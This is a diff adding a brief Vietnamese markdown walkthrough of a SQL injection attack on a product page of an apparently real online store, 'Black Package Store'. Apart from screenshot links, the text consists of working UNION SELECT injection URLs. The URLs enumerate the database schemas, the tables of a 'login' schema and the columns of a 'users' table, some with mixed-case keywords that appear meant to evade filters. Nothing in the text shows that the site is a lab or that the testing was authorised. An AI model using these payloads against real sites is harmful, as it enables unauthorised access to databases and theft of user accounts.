@@ -1,0 +1,40 @@
+# TỔNG QUAN # 
+Kiểm tra trên web "Black Package Store" `https://blackpackagestore.com/product.php?id=72`
+
+# CÁC BƯỚC
+
+![image](https://github.com/user-attachments/assets/df34c6d3-c54f-4b61-a8d8-c942b15b4122)
+
+![image](https://github.com/user-attachments/assets/f1267547-fce3-4a83-8b3a-c647b831057b)
+
+![image](https://github.com/user-attachments/assets/f9557a86-761c-4539-8d4a-e08855dc7b98)
+
+![image](https://github.com/user-attachments/assets/8b967633-6006-433d-80f3-3611674607cc)
+
+![image](https://github.com/user-attachments/assets/3d4a301c-ba81-467e-a6a6-8014fc79e6f1)
+
+https://blackpackagestore.com/product.php?id=72+UNION+ALL+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30
+
+![image](https://github.com/user-attachments/assets/81472dc4-9128-4b8a-a717-ee4fadbfa595)
+
+![image](https://github.com/user-attachments/assets/0935da4c-e509-4d8d-9af8-eefd9a3a2906)
+
+![image](https://github.com/user-attachments/assets/9987c07c-51a6-4722-9bc7-7745975c3fde)
+
+![image](https://github.com/user-attachments/assets/9ea8ba0d-4071-424b-98bb-1dde03b22b6f)
+
+
+https://blackpackagestore.com/product.php?id=72+UNION+SELECT+1,2,3,group_concat(0x7c,schema_name,0x7c),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30+from+information_schema.schemata
+
+![image](https://github.com/user-attachments/assets/3632da54-d00c-4ccb-9c56-6ec40fa147c9)
+
+https://blackpackagestore.com/product.php?id=72+UNION+SELECT+1,2,3,gRoUp_cOncaT(0x7c,table_name,0x7C),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30+fRoM+information_schema.tables+wHeRe+table_schema='login'
+
+![image](https://github.com/user-attachments/assets/998b38ce-8ccb-4b1b-b67a-94892b82c483)
+
+https://blackpackagestore.com/product.php?id=72+UNION+SELECT+1,2,3,gRoUp_cOncaT(0x7c,column_name,0x7C),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30+fRoM+information_schema.columns+wHeRe+table_name=%27users%27
+
+![image](https://github.com/user-attachments/assets/56202ebd-5494-4202-902c-8bcce97b7699)
+
+
+
